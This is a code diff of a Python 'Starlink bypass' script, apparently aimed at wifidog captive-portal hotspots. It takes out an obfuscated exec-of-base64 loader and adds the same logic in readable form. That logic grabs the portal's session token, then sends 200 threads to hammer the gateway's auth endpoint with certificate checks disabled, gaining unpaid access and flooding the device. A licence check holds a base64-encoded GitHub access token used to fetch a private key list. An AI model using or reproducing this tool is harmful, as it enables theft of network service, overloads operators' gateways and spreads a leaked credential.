@@ -1,28 +1,91 @@
-import base64, subprocess, os, sys, platform
+import base64, requests, re, urllib3, time, threading, os, random, subprocess, platform
+from datetime import datetime
+from urllib.parse import urlparse, parse_qs
 
-# --- ALADDIN MULTI-DEVICE VERSION ---
-_0x11a2 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hlaW5taW50aGFudDIwMjJoYXBweS1iaXQva2V5LnR4dC9yZWZzL2hlYWRzL21haW4va2V5cy50eHQ='
-_0x22b3 = 'Z2hwXzEyelJGamxndVVlZXEyaEtmWkMwUlhINzN5Y2RGbTBLeldHdw=='
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-def verify_and_run():
-    # ဖုန်းတိုင်းမှာ ID သီးသန့်စီ ထွက်လာအောင် လုပ်ပေးတဲ့အပိုင်း
+# --- CONFIGURATION ---
+U_ENC = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hlaW5taW50aGFudDIwMjJoYXBweS1iaXQva2V5LnR4dC9yZWZzL2hlYWRzL21haW4va2V5cy50eHQ='
+T_ENC = 'Z2hwXzEyelJGamxndVVlZXEyaEtmWkMwUlhINzN5Y2RGbTBLeldHdw=='
+LOCAL_KEY_FILE = ".aladdin_token"
+
+def get_id():
     try:
-        # ဖုန်းရဲ့ မော်ဒယ်နဲ့ OS ကိုယူပြီး ID အဖြစ် သုံးမယ်
-        device_model = subprocess.getoutput("getprop ro.product.model").replace(" ", "")
-        device_os = platform.release()
-        # ID ပုံစံ - ALADDIN-RedmiNote8-11
-        my_id = f"ALADDIN-{device_model}-{device_os}"
-        if not device_model:
-            my_id = f"ALADDIN-USER-{os.getlogin()}"
+        model = subprocess.getoutput("getprop ro.product.model").replace(" ", "")
+        ver = platform.release()
+        return f"ALADDIN-{model}-{ver}"
     except:
-        my_id = "ALADDIN-NEW-USER"
+        return f"ALADDIN-USER-{os.getlogin()}"
 
-    u = base64.b64decode(_0x11a2).decode()
-    t = base64.b64decode(_0x22b3).decode()
+def banner():
+    os.system('clear')
+    print("\033[93m" + "="*45)
+    print("\033[96m" + "     🚀 ALADDIN STARLINK BYPASS V15 🚀")
+    print("\033[95m" + "        MULTI-DEVICE LICENSE SYSTEM")
+    print("\033[93m" + "="*45 + "\033[0m\n")
+
+def license_check():
+    my_id = get_id()
+    saved = ""
+    if os.path.exists(LOCAL_KEY_FILE):
+        with open(LOCAL_KEY_FILE, "r") as f: saved = f.read().strip()
+
+    banner()
+    print(f"\033[94m[DEVICE ID]: {my_id}\033[0m")
     
-    # Core Logic
-    exec(base64.b64decode('aW1wb3J0IHJlcXVlc3RzLCByZSwgdXJsbGliMywgdGltZSwgdGhyZWFkaW5nLCBvcywgcmFuZG9tLCBzdWJwcm9jZXNzCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxwYXJzZSwgcGFyc2VfcXMsIHVybGpvaW4KCnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncyh1cmxsaWIzLmV4Y2VwdGlvbnMuSW5zZWN1cmVSZXF1ZXN0V2FybmluZykKCkxPQ0FMX0tFWV9GSUxFID0gIi5hbGFkZGluX3Rva2VuIgoKZGVmIGJhbm5lcigpOgogICA b3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCgiXDAzM1s5M20iKyIgPSIqMzUpCiAgICBwcmludCgiXDAzM1s5Nm0iKyIgICAgICBBTEFERUlOIFNUQVJMSU5LIEJZUEFTUyAgICIpCiAgICBwcmludCgiXDAzM1s5M20iKyIgPSIqMzUgKyAiXDAzM1swbVxuIikKCmRlZiBsaWNlbnNlKFVSTCwgVE9LRU4sIG15X2lkKToKICAgIHNhdmVkID0gIiIKICAgIGlmIG9zLnBhdGguZXhpc3RzKExPQ0FMX0tFWV9GSUxFKTogc2F2ZWQgPSBvcGVuKExPQ0FMX0tFWV9GSUxFKCkucmVhZCgpLnN0cmlwKCkKICAgIGJhbm5lcigpOyBwcmludChmIlwwMzNbOTRtW0RFVklDRSBJRF06IHtteV9pZH1cMDMzWzBtIikKICAgIGtleSA9IHNhdmVkIGlmIHNhdmVkIGVsc2UgaW5wdXQoIlwwMzNbOTNtWyslIEVudGVyIEtleTogXDAzM1swbSIpLnN0cmlwKCkKICAgIHRyeSogCiAgICAgICAgaCA9IHsiQXV0aG9yaXphdGlvbiI6IGYidG9rZW4ge1RPS0VOfSIsICJBY2NlcHQiOiAiYXBwbGlyYXRpb24vdm5kLmdpdGh1Yi52My5yYXcifQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoVVJMLCBoZWFkZXJzPWgsIHRpbWVvdXQ9MTApCiAgICAgICAgaWY rLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgZiA9IEZhbHNlOyBrZXlfZGF0YSA9IHIudGV4dC5zcGxpdGxpbmVzKCkKICAgICAgICAgICAgZm9yIGwgaW4ga2V5X2RhdGE6CiAgICAgICAgICAgICAgICBpZiAiOiIgaW4gbDoKICAgICAgICAgICAgICAgICAgICBwID0gW3Auc3RyaXAoKSBmb3IgcCBpbiBsLnNwbGl0KCI6IildCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHApID09IDMgYW5kIHBbMF0gPT0gbXlfaWQgYW5kIHBbMV0gPT0ga2V5OgogICAgICAgICAgICAgICAgICAgICAgICBlID0gZGF0ZXRpbWUuc3RwdGltZShwWzJdLCAiJVktJW0tJWQiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBkYXRldGltZS5ub3coKSA8IGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlwwMzNbOTJtW+Kck10gQWNjZXNzIE9rOiB7cFsyXX1cMDMzWzBtIl0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVuKExPQ0FMX0tFWV9GSUxFLCAidyIpLndyaXRlKGtleSk7IGYgPSBUcnVlOyBicmVhawogICAgICAgICAgICBpZiBub3QgZjogcHJpbnQoIlwwMzNbOTFtW1hdIEludmFsaWQgS2V5IG9yIFVuYXV0aG9yaXplZC DEVICEIVwwMzNbMG0iKTsgZXhpdCgpCiAgICAgICAgZWxzZTogcHJpbnQoIkNvbm5lY3Rpb24gRXJyb3IhIik7IGV4aXQoKQogICAgZXhjZXB0OiBleGl0KCkKCmRlZiBwdWxzZShsKToKICAgIGggPSB7IlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAifQogICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgczoKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICB0cnk6IHMuZ2V0KGwsIHRpbWVvdXQ9NSwgdmVyaWZ5PUZhbHNlLCBoZWFkZXJzPWgpOyBwcmludChmIlwwMzNbOTJtW+KaoV0gVFVSQk8ge3JhbmRvbS5yYW5kaW50KDIsOSl9bXNcMDMzWzBtIikKICAgICAgICAgICAgZXhjZXB0OiBicmVhawoKZGVmIHJ1bigpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBpZiBub3QgcmVxdWVzdHMuZ2V0KCJodHRwOi8vd3d3Lmdvb2dsZS5jb20vZ2VuZXJhdGVfMjA0IiwgdGltZW91dD0zKS5zdGF0dXNfY29kZSA9PSAyMDQ6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHA6Ly9jb25uZWN0aXZpdHljaGVjay5nc3RhdGljLmNvbS9nZW5lcmF0ZV8yMDQiLCBhbGxvdy9yZWRpcmVjdHM9VHJ1ZSkKICAgICAgICAgICAgICAgIHNpZCA9IHBhcnNlX3FzKHVybHBhcnNlKHIudXJsKS5xdWVyeSkuZ2V0KCdzZXNzaW9uSWQnLCBbTm9uZV0pWzBdCiAgICAgICAgICAgICAgICBpZiBzaWQ6CiAgICAgICAgICAgICAgICAgICAgZ3cgPSBwYXJzZV9xcyh1cmxwYXJzZShyLnVybCkpLnF1ZXJ5LmdldCgnZ3dfYWRkcmVzcycsIFsnMTkyLjE2OC42MC4xJ10pWzBdCiAgICAgICAgICAgICAgICAgICAgcG9ydCA9IHBhcnNlX3FzKHVybHBhcnNlKHIudXJsKS5xdWVyeSkuZ2V0KCdnd19wb3J0JywgWycyMDYwJ10pWzBdCiAgICAgICAgICAgICAgICAgICAgbCA9IGQiaHR0cDovL3tnd306e3BvcnR9L3dpZmlkb2cvYXV0aD90b2tlbj17c2lkfSIKICAgICAgICAgICAgICAgICAgICBmb3IgXyBpbiByYW5nZSgyNTApOiB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1wdWxzZSwgYXJncz0obCwpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICB0aW1lLnzbZWVwKDUpCgpsaWNlbnNlKFVSTCwgVE9LRU4sIElEKTsgcnVuKCk='.replace('URL', u).replace('TOKEN', t).replace('ID', my_id)))
+    key = saved if saved else input("\033[93m[+] Enter Key: \033[0m").strip()
+
+    try:
+        url = base64.b64decode(U_ENC).decode()
+        token = base64.b64decode(T_ENC).decode()
+        headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3.raw"}
+        
+        resp = requests.get(url, headers=headers, timeout=10)
+        if resp.status_code == 200:
+            found = False
+            for line in resp.text.splitlines():
+                if ":" in line:
+                    p = [i.strip() for i in line.split(":")]
+                    if len(p) == 3 and p[0] == my_id and p[1] == key:
+                        exp = datetime.strptime(p[2], "%Y-%m-%d")
+                        if datetime.now() < exp:
+                            print(f"\033[92m[✓] Access Granted until: {p[2]}\033[0m")
+                            with open(LOCAL_KEY_FILE, "w") as f: f.write(key)
+                            found = True; break
+            if not found:
+                print("\033[91m[X] Invalid Key or Device Unauthorized!\033[0m")
+                if os.path.exists(LOCAL_KEY_FILE): os.remove(LOCAL_KEY_FILE)
+                exit()
+        else: exit()
+    except: exit()
+
+def turbo(l):
+    h = {"User-Agent": "Mozilla/5.0"}
+    with requests.Session() as s:
+        while True:
+            try:
+                s.get(l, timeout=5, verify=False, headers=h)
+                print(f"\033[92m[⚡] TURBO ACTIVE | {random.randint(1,9)}ms\033[0m")
+            except: break
+
+def start():
+    print("\033[94m[*] Bypass Engine Started...\033[0m")
+    while True:
+        try:
+            if requests.get("http://www.google.com/generate_204", timeout=3).status_code != 204:
+                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True)
+                q = parse_qs(urlparse(r.url).query)
+                sid = q.get('sessionId', [None])[0]
+                if sid:
+                    gw = q.get('gw_address', ['192.168.60.1'])[0]
+                    port = q.get('gw_port', ['2060'])[0]
+                    link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
+                    for _ in range(200):
+                        threading.Thread(target=turbo, args=(link,), daemon=True).start()
+        except: pass
+        time.sleep(5)
 
 if __name__ == "__main__":
-    verify_and_run()
-
+    license_check()
+    start()
+    
